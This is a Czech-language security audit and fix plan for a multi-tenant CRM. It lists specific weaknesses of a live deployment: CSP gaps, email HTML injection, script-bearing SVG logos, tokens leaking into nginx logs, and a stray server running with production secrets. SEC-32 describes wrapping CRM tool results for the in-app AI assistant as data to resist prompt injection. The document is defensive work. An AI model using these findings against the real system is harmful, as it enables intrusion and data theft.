- **SEC-39** CSP bez `base-uri 'self'`, `form-action 'self'`, `frame-ancestors 'self'`, `object-src 'none'`; široké `img-src https:`, `connect-src wss:` (`middleware.ts:23-33`). Se `strict-dynamic` chybějící `base-uri` umožní `<base href>` přesměrovat načítání chunků.
- **SEC-40** Subdomain větev middleware neprovede maintenance redirect ani demo-blok (SEC-06); přepínač `maintenanceMode` v superadmin UI zapisuje do DB, middleware čte jen env → toggle neúčinný. → společné kontroly před větvením; maintenance z DB (cache).
- **SEC-41** `webhooks/inquiry`: `!==` místo `timingSafeEqual`, bez rate-limitu, poptávky natvrdo do nejstarší aktivní org (`nanto`). → nahradit `/api/public/leads` s per-org `ApiKey`.
- **SEC-42** Audit log mezery: web login/logout, neúspěšný login, reset hesla, změna vlastního e-mailu/hesla, pozvánky z onboardingu, export audit logu, import produktů, změna fakturačních údajů firmy, SMTP/API klíče/webhooky, superadmin změny plánu/mazání org (hard-delete bez potvrzení), mazání šablon/dokumentů/kategorií/ceníků, mobilní mutace mimo Predavak.
- **SEC-43** Změna e-mailu v profilu (`settings/profile/route.ts:20-38`) bez hesla a bez potvrzovacího e-mailu. Uživatel se `spravaUzivatelu` (i MANAZER) si může nastavit vlastní roli ADMIN (`settings/users/[id]/route.ts:60-66`) — podle popisu oprávnění záměr, jen upozornění.
- **SEC-44** HTML injection do e-mailů z tenant dat (`lib/email.ts:188, 332-334, 379-380, 428-431` — `jmeno`, `klientJmeno`, `orgNazev`, `kod`, `primaryColor` bez `esc()`), `primaryColor` nevalidován (`org-settings`, `dokumentyChrome.ts:108`). → `esc()` všude (vzor `emailObjednavkaDodavateli`), `^#[0-9a-f]{6}$`.
- **SEC-45** SVG logo s inline skriptem povoleno (`company/logo/route.ts:19`, `logo-bw`) — na auth cestě pravděpodobně blokuje CSP ⚠ neověřeno. → SVG zakázat nebo sanitizovat + `Content-Disposition: attachment`.
- **SEC-46** Vlastní SMTP tenanta (`settings/email/test`) = interní port scan přes rozdílné chybové hlášky. → blocklist jako `validateWebhookUrl` po DNS resolve.
- **SEC-47** ufw povoluje 8083/tcp (nic neposlouchá). → `ufw delete allow 8083/tcp`.
- **SEC-48** Zbytkový E2E `next-server` na `*:3001` od 18. 9. s prod `NEXTAUTH_SECRET` a `sk_live` klíčem (chrání jen ufw); Next 3000 i 3001 poslouchají na všech rozhraních. → kill; `trap` v `scripts/e2e.sh`; `next start -H 127.0.0.1`.
- **SEC-49** Capability tokeny v nginx access logu (`/podpis/<token>` 157×, ICS `token=` 47×, reset 30×, magic 2×; rotace 14 dní, group `adm`). → `log_format` s `$uri` + `map` maskující, nebo `access_log off` pro tyto location.
- **SEC-50** 7 reálných tenant souborů (fotky ze staveb, loga, avatar) tracked v gitu z doby před `.gitignore`. → `git rm --cached -r public/uploads`.
- **SEC-51** PM2 logy bez rotace (`pm2-logrotate` chybí); v logách 0 tajemství/PII (dobré). `Content-Disposition: filename="${jméno klienta}"` (`lib/quoteKod.ts:45`) — uvozovka rozbije hlavičku. Request body bez limitu (`req.json()` až 50 MB); data: URI fotek do DB bez limitu délky.
- **SEC-52** Dashboard server komponenty (~55 souborů) jedou celé přes holý `prisma` bez RLS — všechna volání mají `orgId`, ale právě tady se materializují SEC-08/15 (relační `include` přes owner obchází RLS). Výjimka: `zakazky/[id]/page.tsx:77-88` `auditLog.findMany({ zaznamId })` bez orgId (výsledek se nezobrazí). → postupně `orgPrisma` (`scripts/codemod-orgprisma.js` existuje).

## INFO
- Demo účet `demo@felucia.io` (ADMIN org `demo`) má heslo shodné s literálem v `prisma/seed-demo.ts`; `*.demo@felucia.io`, `admin.applereview@felucia.io` (Apple review, záměr) aktivní; `e2e-admin` v prod není (správně); org `obsolete` s aktivním ADMIN `info@nanto.cz` — zvážit deaktivaci.
- `.env.example` drift: chybí `RLS_DB_*`, `CREDENTIALS_ENCRYPTION_KEY`, `SMSMANAGER_APIKEY`, `SMS_PROVIDER`; `STRIPE_PUBLISHABLE_KEY`/`NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` v `.env` mrtvé.
- Magic-link e-mail odkazuje na `/auth/magic-link`, stránka je `/magic-link` → funkčně rozbité.
- `secretCrypto.ts`: AES-256-GCM, náhodné IV, auth tag OK, formát `v1:` — chybí AAD (šifrotext lze prohodit mezi záznamy; RLS to prakticky brání) a nástroj na re-encrypt.
- `x-tenant-slug` z klienta se na hlavní doméně nestripuje (jen branding signin). `/uploads/logos|avatars|org` jen jakýkoli JWT. HSTS bez `preload`. Sentry DSN stále nenastaven; žádný externí uptime/disk monitoring (disk 27 %, RAM 7,6 GB bez swapu, OOM 0).
- `zakazkyDefaultVedouciId` v OrgSettings — mrtvé nastavení bez ověření.

## Zkontrolováno, OK (pokrytí)
orgPrisma (`AND` where, `scopeData` odmítá cizí orgId, TENANT_MODELS 1:1 se schématem, `$transaction` nastavuje `app.org_id`) · RLS 46/46 tabulek s orgId, fail-closed, `nanto_app` bez superuser/bypassrls/DDL/pgboss · `$queryRaw` jen tagged templates uvnitř `tx` · worker bere orgId z načteného záznamu · Stripe webhook `constructEvent` · superadmin 5 routes + 6 stránek `isSuperAdmin` · jádro zakázek/vyúčtování/předáváků/skladu/objednávek/uživatelů přes `getPerms` + scope helpery · mobilní tech API `requireTechnikOrAdmin` + `canAccess*`, ceny se nevracejí · podpis/nabídka tokeny `randomBytes(32)` + SHA-256 + enc, OTP HMAC max 5 pokusů, `timingSafeEqual` · public leads per-org ApiKey + RL + idempotence · CSRF: cookies `httpOnly sameSite=lax secure` host-only, žádné Server Actions, žádný open redirect · `sanitizeHtml.ts` whitelist bez script/iframe/object/base/form, `link` jen Google Fonts · `hardenPdfPage` JS off + interception jen fonts/data (kromě SEC-11) · klientské náhledy DOMPurify + iframe sandbox · ARES pevná URL, webhooky https-only + blocklist privátních IP + HMAC · SMS normalizace, podpis PNG validace · síť jen 22/80/443, Postgres loopback SCRAM, TLS 1.2/1.3, `server_tokens off`, `/.env`/`/.git` → redirect, wildcard cert do 21. 10. 2026 s auto-renew · SSH jen klíčem, fail2ban, unattended-upgrades, Ubuntu 24.04.5 · cron bez hesel, `rclone.conf` 600, `/root/.secrets` 700, zálohy LAST_OK dnes · `ecosystem.config.js` bez tajemství · PM2 logy bez tajemství.

## Nepokryto
Exploity nebyly spouštěny (závěry z kódu + katalogu). RLS FK-bypass neověřen experimentem (dokumentované chování PG). CSP na auth `/uploads/*` a SVG XSS neověřeno bez session. Externí sken IP/DNS/SPF/DMARC/uptime záměrně netestováno. Přesný dopad Next AVIF advisory na 14.2.x offline neověřitelný. Kód mobilních aplikací (felucia-tech/sales) mimo repo. ~150 orgPrisma routes prošlo heuristicky (grep FK z body + ruční čtení podezřelých), ne řádek po řádku.

---

# PLÁN OPRAV

Pořadí podle poměru riziko/pracnost. Každá vlna = samostatný commit + `deploy.sh`. **Vlna 0 nasadit ještě před `scripts/migrate-podklady-to-disk.ts`.**

## Vlna 0 — hotfix (2026-09-20, NASAZENO commit 38d373f, heslo DB rotováno)
- [x] SEC-01 `logo`/`logoBw` z body se nepřebírají (`app/api/settings/company/route.ts`); `orgLogoDataUrl` jde přes `safeUploadPath` (`lib/uploadSafety.ts`)
- [x] SEC-02 JSON fallback fotek/titulní fotky jen `isImageDataUri`; všechna `unlink`/`readFile` podle cesty z DB přes `safeUploadPath` s prefixem (foto, documents, deals/photos, zamereni, podklady, přílohy SOD)
- [x] SEC-03 typ souboru výhradně z obsahu (magic bytes) + whitelist přípon: podklady (`checkDocumentUpload`), dokumenty org, fotky OP/zakázek (`checkImageUpload`), loga org/šablon/onboarding (`checkLogoUpload`, SVG jen bez skriptů); middleware pro celé `/uploads/*` posílá `CSP: default-src 'none'; sandbox` (PDF bez sandbox) + `Content-Disposition: attachment` mimo obrázky/PDF; mrtvý prefix `/uploads/predavaky/` odstraněn
- [x] SEC-06 demo-blok mutací před větvení podle hostu (platí i na subdoménách)
- [x] SEC-11 `hardenPdfPage` v preview šablony, `htmlContent` přes `sanitizeFullDocumentHtml`, placeholdery escapované (`quoteRenderer.ts`, `quoteHtml.ts`), gate `nastaveniOrg`
- [x] SEC-07 onboarding routes `nastaveniOrg` / invite `spravaUzivatelu` (status GET zůstává jen session), pozvánka v audit logu, import limit 5 MB; `inviteUrl` v odpovědi ponechán (záměrná funkce pro admina bez SMTP — teď jen s oprávněním)
- [x] SEC-12 `.claude/settings.local.json` untracked + `.gitignore`; heslo role `nanto` rotováno 2026-09-20 (`scripts/rotate-db-password.sh`, záloha `.env` v `/root/.env.bak.*`) — historie repa **nepřepsána** (repo bez remote; před prvním pushem `git filter-repo --path .claude/settings.local.json --invert-paths`)
- [x] SEC-13 `images: { unoptimized: true }`; next-auth 4.24.15, dompurify 3.4.15, sanitize-html 2.17.7, puppeteer 24.43.1 (+ `setContentAndWait` místo `networkidle0`), tiptap 3.31.3 → `npm audit` 78 → 45 (zbývá next major, nodemailer, xlsx, dev tooling)
- [x] SEC-47 `ufw delete allow 8083/tcp`; SEC-35 část `chmod 600 .env`; SEC-48 zbytkový E2E server ukončen
- [x] Testy: `tests/uploadSafety.test.ts`, `tests/security-vlna0.test.ts` (route-level regresní), `tests/rls.test.ts` doplněn o FK-bypass case (SEC-08 dokumentace)

## Vlna 1 — vysoké (2026-09-20, čeká na deploy)
- [x] SEC-04 rate-limit v `authorize()` — 20/15 min per IP (`x-real-ip`) + 10/15 min per e-mail, chyba `RATE_LIMITED` s hláškou v loginu; dummy `bcrypt.compare` pro neexistující e-mail (timing). nginx `limit_req` zatím ne (in-memory limit stačí při `instances: 1`)
- [x] SEC-05 `User.sessionVersion` (migrace `20260920113830`), snapshot nese `aktivni/orgAktivni/isSuperAdmin/sessionVersion`; jwt callback při refreshi (≤60 s) vyhodí `SESSION_INVALID` → NextAuth smaže cookie; mobilní JWT nese `sv`, `getMobileSession` + refresh ho ověřují; bump při resetu/změně hesla (`bumpSessionVersion`)
- [x] SEC-08 `lib/ownership.ts` (`isOwned`/`isOwnedOrEmpty` přes orgPrisma) — kontrakty (klientId/dealId/zarizeniId, transakce přes `orgPrisma.$transaction`), deals POST (clientId), zařízení (klientId/dealId); SEC-15 `productId` se naváže jen když je produkt v org, `templateId` ověřen
- [x] SEC-09 `canAccessDeal`/`canAccessQuote` (`lib/zakazkyHelpers.ts`, přes `dealScopeWhere`) ve všech 20 pod-routes `deals/[id]/**` + `quotes/[id]/**`; `leady/[id]/notes` gate `obchod`
- [x] SEC-10 `/uploads/*` → middleware rewrite na `app/api/uploads/[...path]` — auth session/Bearer + kontrola org podle cesty (zakázky přes `canAccessZakazka`, `<orgId>/…`, `org/<orgId>`, avatary, zaměření); veřejná jen loga (login stránka tenanta); mobil dostává podepsané odkazy (`lib/uploadSign.ts`, HMAC, 7 dní) přes `toAbsoluteUrl` a odpovědi uploadů; whitelist MIME, CSP sandbox, `Content-Disposition` mimo obrázky/PDF. Soubory zůstávají v `public/uploads` (rewrite má přednost před statickým servírováním)
- [x] SEC-14 `scripts/nginx-default-catchall.conf` + `install-nginx-catchall.sh` — nainstalováno 2026-09-20: neznámý Host na 80/443 → 444, TLS pro neznámý Host s certem felucia.io
- [x] Testy: `tests/security-vlna1.test.ts` (14), `tests/setup.ts` načítá `NEXTAUTH_SECRET`; test DB synchronizována `prisma db push`

**Po nasazení Vlny 1 lze spustit `scripts/migrate-podklady-to-disk.ts`** (podklady už nejsou veřejné).
**Ověřit na telefonu:** felucia-tech zobrazuje fotky zakázek (podepsané URL z API) — pokud appka skládá URL sama z relativní cesty bez query, fotky se nezobrazí → dočasně vrátit veřejný prefix nebo opravit appku.

## Vlna 2 — střední

### Dávka 2a (2026-09-20, kód — čeká na deploy + `psql -f prisma/rls.sql` na prod)
- [x] SEC-16 `generate-rls-sql.ts` generuje policy i pro 15 dětských tabulek (EXISTS na rodiče přes první povinnou relaci), `_ProductCategories`, `organizations` (jen vlastní řádek) a odebírá DML na `system_settings`; test DB má nový `rls.sql` přes `tests/setup.ts`; **prod: `psql <DATABASE_URL> -f prisma/rls.sql` po deployi**
- [x] SEC-21 nákupní ceny: `GET /api/deals/[id]/quotes`, `mobile/obchod/nabidka/[id]`, `mobile/obchod/produkty` vrací `nakupniCena`/`nakladovaCena` jen s `financeNakupky`
- [x] SEC-22 `clientScopeWhere` (`lib/permissions.ts`) — bez `obchod` jen klienti z vlastních zakázek/servisu; `GET /api/clients` + `/api/search` (klienti i OP dle `dealScopeWhere`)
- [x] SEC-23 servis: kontrakty/zařízení/reaktivní gate `servisDispecink`; `fotky`/`polozky`/`reklamace`/`vyuctovat` přes `canAccessServisniZakazkaWeb` (rozsah `servis`)
- [x] SEC-24 `nastaveniOrg` na categories/**, ceniky/**/polozky, contract-templates/**, settings/quote-templates POST; dokumenty upload `obchod`, DELETE `obchodMazani || nastaveniOrg`
- [x] SEC-28 `mobileDealScope` (`lib/mobile-helpers.ts`) ve všech `mobile/obchod/**` čteních i mutacích OP/nabídek/SoD/zaměření/aktivit
- [x] SEC-17 web login iteruje kandidáty per org (heslo rozhodne), forgot/magic-link pošlou odkaz pro každý účet (předmět s názvem org); oprava URL magic-linku (`/magic-link`)
- [x] SEC-18 `typeof email === 'string'` ve forgot/magic-link/register; register normalizuje `slug` jako check-slug, validuje e-mail
- [x] SEC-19 impersonační cookie podepsaná HMAC (`lib/signedCookie.ts`, `lib/impersonate.ts`), session ověřuje podpis + příslušnost admina k org, DELETE vyžaduje JWT superadmina; `logAction` přidává `_impersonator` do každého záznamu během impersonace
- [x] SEC-27 `getClientIp` (x-real-ip) v public podpis/nabídka routes; audit IP u podpisu preferuje x-real-ip
- [x] SEC-31 CSV export: každé pole v uvozovkách + apostrof před `= + - @`
- [x] Testy `tests/security-vlna2.test.ts` (10); `tests/tenant-isolation.test.ts` upraven na RLS chování organizations

### Dávka 2b (2026-09-20, kód — čeká na deploy)
- [x] SEC-25 ICS token verzovaný (`User.calendarTokenVersion`, migrace `20260920135050`), route vyžaduje `aktivni` uživatele i org a filtruje OP/servis podle `dealScopeWhere`/`servisScopeWhere`; tlačítko „Obnovit odkaz" v profilu (`POST /api/settings/profile/calendar-token`)
- [x] SEC-26 veřejná QR stránka zařízení bez kontaktů/adresy majitele (jen křestní jméno + iniciála), místo toho kontakt na servisní firmu; `POST /api/servis/zarizeni/[id]/qr-token` = rotace tokenu (`servisDispecink`); UI tlačítko rotace zatím ne
- [x] SEC-29 příloha VOP/VZSP/ceník: magic bytes `%PDF-` + limit 10 MB
- [x] SEC-30 xlsx 0.20.3 z cdn.sheetjs.com (ReDoS/prototype pollution opraveno)
- [x] SEC-32 Dáša: `message` jen string ≤ 4000 znaků, `history` validovaná (role/typ/délka, max 8), kontext OP načten z DB podle ID (ne z klienta), výsledky nástrojů obalené `<data source="crm">` + instrukce v system promptu, `change_deal_status` s potvrzením
- [ ] SEC-20 mobilní refresh token v DB — odloženo (sessionVersion už zneplatní token při změně hesla/deaktivaci; plná rotace vyžaduje změnu appky)
- [ ] SEC-13 nodemailer 10 — **nelze**: next-auth 4.24 má peerOptional `nodemailer ^7`, verze 10 rozbíjí `npm install`. Přijaté riziko: advisories se týkají `envelope.size`, EHLO/HELO transport name a List-* hlaviček (u nás jen z konfigurace), `to` validováno regexem. Přehodnotit při přechodu na Next 15 / next-auth 5.

### Dávka 2c (infra, s Radkem)
- [ ] SEC-33 PM2 pod userem `nanto`; SEC-34 Node 22; SEC-35 zálohy šifrované + `chmod 700 /root/backups`

## Vlna 3 — nízké / hygiena (průběžně)
- [ ] SEC-36 hashované reset/magic tokeny · SEC-37/38 enumerace, slug/e-mail/heslo validace · SEC-39 CSP `base-uri`/`form-action`/`frame-ancestors` · SEC-40 maintenance z DB · SEC-41 inquiry webhook → ApiKey · SEC-42 audit log doplnit · SEC-43 změna e-mailu s heslem · SEC-44 `esc()` v e-mailech + `primaryColor` regex · SEC-45 SVG loga · SEC-46 SMTP blocklist · SEC-49 nginx log maskování · SEC-50 `git rm --cached public/uploads` · SEC-51 pm2-logrotate, `filename*=` · SEC-52 dashboard stránky na orgPrisma · INFO: magic-link URL, `.env.example`, org `obsolete`, Sentry DSN, uptime monitoring
